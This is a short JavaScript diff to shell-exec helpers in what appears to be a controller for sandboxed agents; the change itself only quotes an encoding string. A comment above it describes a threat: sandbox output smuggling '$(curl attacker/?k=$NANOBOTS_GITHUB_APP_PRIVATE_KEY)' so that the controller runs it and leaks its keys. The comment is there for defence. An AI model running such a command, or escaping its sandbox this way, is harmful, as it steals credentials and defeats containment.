@@ -57,7 +57,7 @@ function shTry(cmd, opts = {}) {
 // $(curl attacker/?k=$NANOBOTS_GITHUB_APP_PRIVATE_KEY) in its output and have the CONTROLLER
 // run it. The controller holds DAYTONA_API_KEY and the App private key; the sandbox must
 // never be able to reach them.
-function shStdin(cmd, input) { return execSync(cmd, { encoding: utf8, input }); }
+function shStdin(cmd, input) { return execSync(cmd, { encoding: 'utf8', input }); }
 function shStdinTry(cmd, input) { try { return shStdin(cmd, input); } catch { return null; } }
 
 function shJson(cmd) {
